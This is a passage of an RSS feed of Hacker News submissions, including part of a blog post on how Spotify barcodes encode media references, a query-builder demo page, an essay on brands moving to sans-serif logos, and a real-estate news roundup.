    [<span>0</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>7</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>1</span>, <span>1</span>, <span>1</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>1</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>3</span>, <span>0</span>, <span>6</span>, <span>0</span>, <span>0</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>4</span>, <span>4</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>4</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>0</span>, <span>5</span>, <span>4</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>0</span>, <span>6</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>2</span>, <span>2</span>, <span>0</span>, <span>2</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>5</span>, <span>0</span>, <span>4</span>, <span>0</span>]
</code></pre></div><p>The barcode consists of 23 bars, of which only 20 actually contain information. This means that there are <code>8^20</code> pieces of information that can be encoded into the code.</p><h2 id="uris-to-barcodes">URIs to Barcodes</h2><p>How do you convert a <code>63^22</code> bit URI into an <code>8^20</code> bit barcode? There is <code>2.3e+21</code> times as much information in the URI than there is in the barcode. This is when I started asking questions and hunting for answers. <a href="https://stackoverflow.com/questions/47267924/string-encryption-generate-unique-pattern-like-spotify-codes/62120952#62120952">This question</a> was a start, but I ended up asking <a href="https://stackoverflow.com/questions/62121301/encoding-spotify-uri-to-spotify-codes">this SO question</a> and getting a couple of answers that linked to the relevant patents and contained more info about Spotify’s look up table.</p><p><a href="https://data.epo.org/publication-server/rest/v1.0/publication-dates/20190220/patents/EP3444755NWA1/document.pdf">Here is one patent</a>.</p><p><a href="http://www.freepatentsonline.com/20180181849.pdf">Here is another, more recent patent</a></p><blockquote><p>“Patents are the worst” - Peter Boone</p></blockquote><p>Let me just say: patents are the worst. They are so dense. I used to think academic papers were full of jargon until I read some technical patents.</p><h3 id="the-process">The Process</h3><p>When you visit <a href="https://www.spotifycodes.com/">Spotify codes</a> and input a Spotify URI, a “media reference” is created by Spotify. This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotify’s database (a look-up table) to determine what URI it corresponds to. A Stack Overflow user <a href="https://stackoverflow.com/a/63479041/10703868">discovered</a> that you can sniff the request that your phone makes when scanning the barcode to determine the media reference and API endpoint.</p><div><pre><code data-lang="python">heights <span>=</span> [<span>0</span>, <span>2</span>, <span>6</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>0</span>]
media_reference <span>=</span> <span>"67775490487"</span>
uri <span>=</span> <span>"spotify:user:jimmylavallin:playlist:2hXLRTDrNa4rG1XyM0ngT1"</span>
</code></pre></div><p>There are a few steps required to turn a media reference into a Spotify code (and vis versa).</p><h3 id="cyclic-redundancy-check">Cyclic Redundancy Check</h3><p>A <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">Cyclic redundancy check</a> is calculated for the media ref. Based on the fact that 8 bits are calculated, I am assuming Spotify uses CRC8.</p><div><pre><code data-lang="python"><span>import</span> crc8

hash <span>=</span> crc8<span>.</span>crc8()
media_ref <span>=</span> <span>67775490487</span>
ref_bytes <span>=</span> media_ref<span>.</span>to_bytes(<span>5</span>, byteorder<span>=</span><span>"big"</span>)
<span>print</span>(ref_bytes)
<span># b'\x0f\xc7\xbb\xe9\xb7'</span>
hash<span>.</span>update(ref_bytes)
check_bits <span>=</span> hash<span>.</span>digest()
<span>print</span>(check_bits)
<span># b'\x0c'</span>
</code></pre></div><p>Append the crc to the media reference:</p><div><pre><code data-lang="python">media_reference <span>=</span> <span>b</span><span>'</span><span>\x0f\xc7\xbb\xe9\xb7\x0c</span><span>'</span>
</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</a></em></p>]]>
            </description>
            <link>https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138041</guid>
            <pubDate>Wed, 18 Nov 2020 15:45:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Airboxr – Query Builder for Google Sheets]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25137929">thread link</a>) | @SpeckOfDust
<br/>
November 18, 2020 | https://airboxr.com/demo | <a href="https://web.archive.org/web/*/https://airboxr.com/demo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><img height="1" width="1" src="https://www.facebook.com/tr?id=565404374208121&amp;ev=PageView&amp;noscript=1">

<!-- End Facebook Pixel Code -->
<!-- Custom -->

<!-- Custom -->

    


    

    
        
        
            <meta name="author" content="Mayank Verma">
        
    



    <!-- Google Tag Manager (noscript) -->

  

<!-- End Google Tag Manager (noscript) -->

    <!-- Header -->







  




<!-- /Header -->

    <!-- Text Section -->

<section data-id="95dcb1dc-4bd8-48f7-b11d-6bf022033f50">

    

    
      
    

    


<div>







<div>

        
        




<div>







<div>

    <!-- Text -->
    <h2>Try our interactive demo</h2><p>Works best on a desktop browserâ€”if you are on a mobile, <a href="#sendlink">click here</a>.</p>
    
    



    
    <!-- /Text -->
</div>
</div>


    </div>
</div>
</section>

<section data-id="25fad6b1-d3ff-4097-a3fc-2846df6e60c5">

    

    
      
    

    


<div>







<div>

        
        
    <!-- Custom -->
    <div>
        
<div>
  
  <div id="loadingOverlay">
    <div>
      <div>
        <h4>
          Hi ðŸ‘‹ðŸ�¼, your task today is to import a list of countries that meet a specific criteria.
        </h4>
        <p>You will be provided with a connected source to import from.</p>
      </div>

      <div>
        <p>Creating your playground...</p>
        
      </div>
    </div>
  </div>
</div>



    </div>
    <!-- /Custom -->

    </div>
</div>
</section>

<section data-id="5c9a8431-aec5-4a66-9a94-f1f23df7f0fa">

    

    
      
    

    


<div>







<div>

        
        
    <!-- CTA -->
    <div>
        


<div>







<div>

        <p><span>Simply click the button below to download the plugin. What's more: all accounts registered before December 31, 2021 get an early-bird pricing of $9/mo/user </span><mark><span>forever</span></mark><span>.</span></p>
    </div>
    </div>
    </div>
    <!-- /CTA -->
    
    



    

    </div>
</div>
</section>
<!-- Text Section -->

<section id="sendlink" data-id="6231dac0-0fa9-4812-bf36-751d5e538ce4">

    

    
      
    

    


<div>







<div>

        
        




<div>







<div>

    <!-- Text -->
    <h2>On a mobile? </h2><p>Leave us your e-mail below and we will send you a link to this page. You can test it out when you're back at your desk.</p>
    
    



    
    <!-- /Text -->
</div>
</div>


    </div>
</div>
</section>

    
    <!-- Footer -->



<!-- /Footer -->

    <!-- Intercom -->


<!-- /Intercom -->
<!-- Hotjar -->

<!-- /Hotjar -->
    
        
    
    
    
    
    
    
    
    
    <!-- /Animation -->


</div>]]>
            </description>
            <link>https://airboxr.com/demo</link>
            <guid isPermaLink="false">hacker-news-small-sites-25137929</guid>
            <pubDate>Wed, 18 Nov 2020 15:38:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why do so many brands change their logos and look like everyone else?]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25137923">thread link</a>) | @sabon
<br/>
November 18, 2020 | https://velvetshark.com/articles/why-do-brands-change-their-logos-and-look-like-everyone-else | <a href="https://web.archive.org/web/*/https://velvetshark.com/articles/why-do-brands-change-their-logos-and-look-like-everyone-else">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A few months ago, I received an email from Revolut (a British fintech company) in which they proudly unveiled their new logo. Previously, Revolut had a distinct and instantly recognizable logo. They replaced it with… something I was sure I had seen before.</p><figure id="w-node-3786e8b28af7-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51cf030355219306e8edf_revolout-logo-old-new.png" loading="lazy" alt=""></p></figure><p>The previous Revolut logo had a unique font, a recognizable color gradient, and it was slanted. If you were to put 100 financial or tech companies’ logos next to each other, the old logo would be easy to find at a glance.</p><p>If you put the new one in the same 100 logos pile, it would drown in the sea of sameness.</p><h2>Sans serif invasion</h2><p>There is a trend in logo design that started around 2017-2018. It’s as if many companies decided that being unique was a handicap and that it was better to be like everyone else. Or at least, that’s how it feels to me.</p><p>The trend started with fashion logos. Many iconic fashion companies ditched their recognizable logos and switched to a bland and very similar version of a sans serif font.</p><p>The technology sector followed soon after.</p><figure id="w-node-519323ea72d8-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51d96d2b8eae559c71d90_tech-fashion-logos-sans-serif.png" loading="lazy" alt=""></p></figure><p>All the quirks, peculiarities, and idiosyncrasies of both tech and fashion logos were dropped and replaced with a simple sans serif font.</p><p>It looked like two huge industries decided to use the services of one designer, and not a particularly inventive one at that.</p><p>The tech industry is in slightly better shape because they didn’t go all in, and at least they kept the colors. With the colors, there’s at least <em>some </em>variability:</p><figure id="w-node-1efc3a7d060a-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51dc4daea171c45c758db_tech-logos-color.png" loading="lazy" alt=""></p></figure><p>Variability in new fashion logos, in full color:</p><figure id="w-node-b31dea70a84e-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51dd2ab19486dcee8bcea_fashion-logos-color.png" loading="lazy" alt=""></p></figure><h3>Serif and sans serif—what’s the difference?</h3><p>First, what’s the difference between serif and sans serif fonts?</p><figure id="w-node-7e6a894d6cf3-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51e06556217fb8d809964_serif-sans-serif.gif" loading="lazy" alt=""></p></figure><p>The small features on the ends of strokes in some fonts are known as ‘serifs’.</p><p>Fonts without those small features are called ‘sans serif’ (<em>‘sans’</em> means <em>‘without’</em> in French).</p><p>Sans serifs are missing a few of the typical anatomical features (serifs, spurs, swashes and other flourishes). Because of that, this typeface lacks the level of detail and design differentiation that serif typefaces can have.</p><p>While the simplicity of sans serif fonts makes them readable and versatile, it has its drawbacks. Without additional details and features, sans serif fonts have far fewer options for differentiation. While you can vary things like the height, weight, and slant, sans serif fonts simply have fewer features to work with than their more intricate fellow fonts.</p><p>This results in logos that look very similar. Gone are all the elaborate little details of the previous era.</p><p>When you add brands’ tendency to go black-and-white, you end up with a sea of logo sameness which is the opposite of what logos should be.</p><p>The purpose of a logo is to be instantly recognizable, different, memorable, and, if possible, to refer to the brand’s values. Blending into everyone else’s achieves none of these things.</p><h3>Sans serif history</h3><p>Sans serif lettering and fonts, first created in 1816, were popular for their clarity and legibility at a distance in advertising and display use when printed very large or small.</p><p>Because sans serif type was often used for headings and commercial printing, many early sans serif designs did not feature lowercase letters.</p><p>Simple sans serif capitals, without the use of lowercase, became very common in uses such as tombstones of the Victorian period in Britain.</p><p>Also, a significant reason for serif faces in the older days of imprecise letterpress and less consistent paper surface sizing was to compensate for ink spread and aberrations. Serifs on the fonts helped in cases where corners would otherwise fail to fully imprint.</p><h2>Possible reasons</h2><p>What are the possible reasons for this sans serif trend taking over? And why do hardly any of them matter?</p><h3>‘Modern utility’</h3><p>Branding specialists point to the practical benefits of what they call the ‘modern utility’ of sans serif typefaces. Cleaner and more legible, they are better suited to a variety of media and work particularly well online. The purity of these fonts allows the brands to be an empty vessel, ready to accommodate rapidly shifting trends.</p><p><strong>Counterpoint:</strong> That may be true, but isn’t the whole value of a brand to <em>not</em> be an empty vessel? The big brands have worked decades for their identity and recognition, only to throw most of it away?</p><h3>Simplification</h3><p>Another reason cited by brand specialists is that it’s a natural step for brands to take as they grow from scrappy startups into established brands. The goals have shifted from making noise and standing out to being a trusted, dependable part of people’s everyday lives. That heartfelt personality and idiosyncrasy that defined a brand as they started out, and won over their early adopters, can be a limitation as they aim for broad appeal and bigger revenue.</p><p><strong>Counterpoint:</strong> Simplification as a reason to blend in for broad appeal? I don’t buy it. Logos should be simple, yes, but they should be simple in a memorable way. Think more in terms of Nike swoosh (simple, memorable),&nbsp; and less in a one-size-fits-all sans serif font.</p><h3>Brands are more than logos now</h3><p>People at the head of these powerful brands know that they are not defined by their logo anymore but by the product or service they provide. They are strong thanks to what they allow <em>you</em> to do with them.</p><p>Before, logo designers would look for a ‘concept’ when designing a logo. That is not necessary anymore: <em>The brand is the concept</em>.</p><p>Their thinking goes that logos may look similar, but what they offer is completely different and effective, and that’s what ultimately counts for the consumer.</p><p>As some brands become words (or even better, verbs) in our daily language (to Google, to Uber, to Skype), they have a lesser need for a recognizable logo. Many of those brands now spend on designing custom typefaces instead of logos: a custom typeface becomes their recognizable voice on every platform or device.</p><p><strong>Counterpoint:</strong> Some big brands may indeed have a lesser need for a very distinct logo but that doesn't mean that they should get rid of an important differentiator. You don’t see Nike replacing their swoosh logo with sans serif <strong>NIKE</strong> text. If you have something valuable that you <em>can</em> live without, it doesn’t mean that you <em>must</em>.</p><h3>Readability</h3><p>One of the main reasons for the sans serif logo trend is readability. Especially on mobile, but everywhere else as well: from huge billboards to tiny footer links at the bottom of mobile websites.</p><p>After all, that’s the very reason why sans serif fonts were invented: for better readability in advertising headlines.</p><p><strong>Counterpoint:</strong> Readability is obviously important. Mobile too—it’s where everything happens nowadays. But this is becoming less of an issue with improvements in technologies like retina displays and 4k screens becoming popular.</p><figure id="w-node-38988d1753c7-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51e96e07b893538cbb00b_sans-serif-logos-on-iphone-11.png" loading="lazy" alt=""></p><figcaption>Here’s how a bunch of logos looks on my iPhone 11</figcaption></figure><p>If it’s easy to fit 30 decently looking logos on one-third of a phone screen, it should be trivial to make one logo, however quirky, look perfect on mobile.</p><p>Revolut seems to be torn here. They did replace the logo everywhere inside the app, but how does their new app icon look like?</p><figure><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51ed3fd0200eeffdc690d_revolut-app-icon.jpg" loading="lazy" alt=""></p></figure><h2>What next?</h2><p>There’s nothing bad in wanting your logo to look simpler, better, mobile-ready, or universal enough to appeal to the broadest possible audience.</p><p>But don't throw the baby out with the bathwater.</p><p>Shoot for simplicity and legibility, but keep your distinguishing features. Don’t throw away what the brand has been working on for decades.</p><p>Otherwise, you may end up in a situation where you could slap any logo on any product and hardly anyone would notice a difference:</p><figure id="w-node-1f59c0278e26-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51fac8ae18b830d998184_sans-serif-bags.jpg" loading="lazy" alt=""></p><figcaption>One of these bags is real.</figcaption></figure></div></div>]]>
            </description>
            <link>https://velvetshark.com/articles/why-do-brands-change-their-logos-and-look-like-everyone-else</link>
            <guid isPermaLink="false">hacker-news-small-sites-25137923</guid>
            <pubDate>Wed, 18 Nov 2020 15:37:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Weekly Digs NEWSLETTER -- Is an “Eviction Tsunami” looming in 2021?]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25137873">thread link</a>) | @cpow85
<br/>
November 18, 2020 | https://theweeklydigs.com/2020/11/18/is-an-eviction-tsunami-looming-in-2021/ | <a href="https://web.archive.org/web/*/https://theweeklydigs.com/2020/11/18/is-an-eviction-tsunami-looming-in-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-240">
		
	
	<div>
		
<p>This week on The Weekly Digs: Is an “Eviction Tsumami” looming in 2021? The U.S. economy has only recovered half the 22 million jobs lost during 2020; meanwhile, stimulus checks and support for unemployed is drying up fast. On another note, the housing market in the U.S. continues to be red hot. This and more, below the fold.</p>



<h2>For free real estate news every week, sign up for The Weekly Digs</h2>



	<div data-blog-id="165588401">
		<div>
			<form aria-describedby="wp-block-jetpack-mailchimp_consent-text">
				
				

				<p id="wp-block-jetpack-mailchimp_consent-text">
					By clicking submit, you agree to share your email address with the site owner and Mailchimp to receive marketing, updates, and other emails from the site owner. Use the unsubscribe link in those emails to opt out at any time.				</p>

				
			</form>
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	



<ul>
    <li>
        <a href="https://sparkrental.com/eviction-crisis/">
            Is an “Eviction Tsunami” Looming in 2021?
        </a>
        <ul>
            <li>
                Millions of Americans remain out of work in the coronavirus pandemic, after the economy has recovered only half of the 22 million jobs lost in the spring of 2020. Meanwhile, the stimulus checks and extended unemployment benefits are ancient history by November. This…
            </li>
        </ul>
    </li>
</ul>



    <ul>
      <li>
        <h2>
          <a href="https://www.biggerpockets.com/show417">
            BiggerPockets Podcast 417: 9 Ways to Tweak Your Mindset So You Can Lock Down Deals with Brandon and David
          </a>
        </h2>
        <ul>
          <li>
            <p>
              Are you a new or aspiring real estate investor who hasn’t locked down your first deal? Or maybe you haven’t hit your personal goal or unit count yet. If so, you may need to tweak your mindset to reach new heights.
Brandon and David are back flying solo on this weekend’s episode to talk about the 9 m
            </p>
          </li>
        </ul>
      </li>
    </ul>
  


    <h2>From <a href="https://www.calculatedriskblog.com/">Calculated Risk’s</a> Most recent posts</h2>
    <hr>
    <ul>
      
          <li>
            <a href="https://www.calculatedriskblog.com/2020/11/comments-on-october-housing-starts.html">
              
Comments on October Housing Starts

            </a>
            <ul>
              <li>
                
by Calculated Risk on 11/18/2020 09:32:00 AM

              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.calculatedriskblog.com/2020/11/housing-starts-increased-to-1530.html">
              
Housing Starts increased to 1.530 Million Annual Rate in October

            </a>
            <ul>
              <li>
                
by Calculated Risk on 11/18/2020 08:38:00 AM

              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.calculatedriskblog.com/2020/11/mba-mortgage-applications-decrease-in_18.html">
              
MBA: Mortgage Applications Decrease in Latest Weekly Survey

            </a>
            <ul>
              <li>
                
by Calculated Risk on 11/18/2020 07:00:00 AM

              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.calculatedriskblog.com/2020/11/wednesday-housing-starts.html">
              
Wednesday: Housing Starts

            </a>
            <ul>
              <li>
                
by Calculated Risk on 11/17/2020 09:15:00 PM

              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.calculatedriskblog.com/2020/11/november-17-covid-19-test-results.html">
              
November 17 COVID-19 Test Results; Record Hospitalizations

            </a>
            <ul>
              <li>
                
by Calculated Risk on 11/17/2020 07:57:00 PM

              </li>
            </ul>
          </li>
        
    </ul>
  

    <h2>From <a href="https://www.realtor.com/news/real-estate-news/">Realtor.com’s</a> Latest News</h2>
    <hr>
    <ul>
      
          <li>
            <a href="https://www.realtor.com/news/real-estate-news/home-builder-confidence-surges-to-new-record-high-as-sales-volume-grows/">
              Home Builder Confidence Surges to New Record High as Sales Volume Grows
            </a>
            <ul>
              <li>
                The construction industry’s outlook improved again in November, according to research from a trade group released Monday.
              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.realtor.com/videos/economic-update-this-week-signs-of-improvement-/54dc0d4b-a15b-46c1-a476-c1208dd5d02d">
              Economic Update This Week: Signs of Improvement?
            </a>
            <ul>
              <li>
                
              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.realtor.com/news/real-estate-news/u-s-housing-market-takes-a-breather-but-stays-hot/">
              U.S. Housing Market Takes a Breather But Stays Hot
            </a>
            <ul>
              <li>
                Between the presidential election and a new wave of coronavirus cases, buyers and sellers had reasons to pause, report finds.
              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.realtor.com/news/real-estate-news/home-prices-rise-by-double-digits-in-much-of-country/">
              Despite Uncertainty, Home Prices Are Rising by Double Digits in Much of Nation
            </a>
            <ul>
              <li>
                Home prices sharply headed up—even as the turmoil over a hotly contested presidential election, the coronavirus pandemic, and high unemployment persisted.
              </li>
            </ul>
          </li>
        
    </ul>
  

    <h2>From <a href="https://sparkrental.com/rental-income-blog/">Spark Rental’s</a> Latest Blog Posts</h2>
    <hr>
    <ul>
      
          <li>
            <a href="https://sparkrental.com/property-taxes-by-state/">
              Property Taxes by State &amp; County: Lowest Property Taxes in the US Mapped
            </a>
            <ul>
              <li>
                Where are the lowest property taxes in the US? The highest property taxes? Some states offer no surprises. New Jersey, for example, charges the highest property taxes in the nation as a statewide average. But Texas also ranks among the top five highest property taxes…
              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://sparkrental.com/eviction-crisis/">
              Is an “Eviction Tsunami” Looming in 2021?
            </a>
            <ul>
              <li>
                Millions of Americans remain out of work in the coronavirus pandemic, after the economy has recovered only half of the 22 million jobs lost in the spring of 2020. Meanwhile, the stimulus checks and extended unemployment benefits are ancient history by November. This…
              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://sparkrental.com/due-diliegence-real-estate/">
              What Is Due Diligence in Real Estate, and How Do You Do It?
            </a>
            <ul>
              <li>
                In short, due diligence in real estate means “do your homework.” This goes beyond looking for the “perfect” property, whether for your personal residence or an investment. Due diligence means conducting thorough research to ensure the home is a good investment before…
              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://sparkrental.com/capital-gains-tax-real-estate/">
              Capital Gains Tax on Real Estate – And How to Avoid It
            </a>
            <ul>
              <li>
                Real estate investments come with a slew of tax advantages. While you own the property as a rental, you can take nearly two dozen landlord tax deductions.&nbsp; Then, when it comes time to sell, you can reduce or avoid capital gains taxes on real estate through another…
              </li>
            </ul>
          </li>
        
    </ul>
  

    <h2>From <a href="https://biggerpockets.com/blog">Bigger Pockets’</a> Top Popular Posts</h2>
    <hr>
    <ul>
      
          <li>
            <a href="https://biggerpockets.com/blog/i-will-never-trust-real-estate-wholesalers">
              Opinion: I Don’t Trust Anyone Who Wholesales—Here’s Why
            </a>
            <ul>
              <li>
                By Darren Sager
              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://biggerpockets.com/blog/should-real-estate-investors-leave-california">
              If ‘Everyone’ Is Leaving California, Should Real Estate Investors Leave, Too?
            </a>
            <ul>
              <li>
                By Andrew Syrios
              </li>
            </ul>
          </li>
        
          <li>
            <a href="https://biggerpockets.com/blog/foreclosures-u-s-increase-covid-continues-rise">
              Foreclosures in the US Increase as COVID Continues To Rise
            </a>
            <ul>
              <li>
                By BiggerPockets
              </li>
            </ul>
          </li>
        
    </ul>
  

    <h2>From <a href="https://realpage.com/blog">PM Insider’s</a> Latest Posts</h2>
    <hr>
    <ul>
      
          <li>
            <a href="https://www.realpage.com/blog/data-makes-the-difference-in-gaining-control-of-multifamily-utilities/">
              Data Makes the Difference in Gaining Control of Multifamily Utilities
            </a>
          </li>
        
          <li>
            <a href="https://www.realpage.com/blog/automated-multifamily-vendor-payment-processing-is-saving-time-money-and-headaches/">
              Automated Multifamily Vendor Payment Processing  is Saving Time, Money and Headaches
            </a>
          </li>
        
          <li>
            <a href="https://www.realpage.com/blog/multifamily-pmcs-using-benchmarking-to-optimize-marketing-spend/">
              Multifamily PMCs Using Benchmarking to Optimize Marketing Spend
            </a>
          </li>
        
          <li>
            <a href="https://www.realpage.com/blog/affordable-compliance-speed-vs-accuracy-in-certifications/">
              Affordable Compliance: Speed vs. Accuracy in Certifications
            </a>
          </li>
        
    </ul>
  


    <h2>From Reddits <a href="https://reddit.com/r/realestate">/r/RealEstate</a> Subreddit</h2>
    <hr>
    <ul>
      
          <li>
            <a href="https://www.reddit.com/r/RealEstate/comments/jtxgvt/i_just_signed_my_title_on_a_three_story_town/">
              I just signed my title on a three story town house using the VA loan on veterans day and closed on Friday the 13th.. first time home buyer. I’ll remember this day to infinity.
            </a>
            <ul>
            <li>
              current score on reddit: 511
            </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.reddit.com/r/RealEstate/comments/jv4ksz/i_just_put_in_an_offer_40_thousand_over_asking/">
              I just put in an offer 40 THOUSAND over asking and still did not get the home in Grand Rapids,MI. Tell me there is still hope for me.
            </a>
            <ul>
            <li>
              current score on reddit: 283
            </li>
            </ul>
          </li>
        
          <li>
            <a href="https://www.reddit.com/r/RealEstate/comments/jvky5z/real_estate_brokers_keep_cold_calling_my_parents/">
              Real Estate Brokers keep cold calling my parents asking if they want to sell their home. These calls are increasing in frequency and they even managed to get my cell phone number even though I do not live there.
            </a>
            <ul>
            <li>
              current score on reddit: 256
            </li>
            </ul>
          </li>
        
    </ul>
  

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://theweeklydigs.com/2020/11/18/is-an-eviction-tsunami-looming-in-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25137873</guid>
            <pubDate>Wed, 18 Nov 2020 15:33:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Improving your Vim workflow with fzf]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25137793">thread link</a>) | @jerodsanto
<br/>
November 18, 2020 | https://pragmaticpineapple.com/improving-vim-workflow-with-fzf/ | <a href="https://web.archive.org/web/*/https://pragmaticpineapple.com/improving-vim-workflow-with-fzf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><span>
      <span></span>
  <img alt="Pineapple on a beach" title="Pineapple on a beach" src="https://pragmaticpineapple.com/static/d844e61d88396079b127a2cb42ebe966/1c72d/cover.jpg" srcset="https://pragmaticpineapple.com/static/d844e61d88396079b127a2cb42ebe966/a80bd/cover.jpg 148w,
https://pragmaticpineapple.com/static/d844e61d88396079b127a2cb42ebe966/1c91a/cover.jpg 295w,
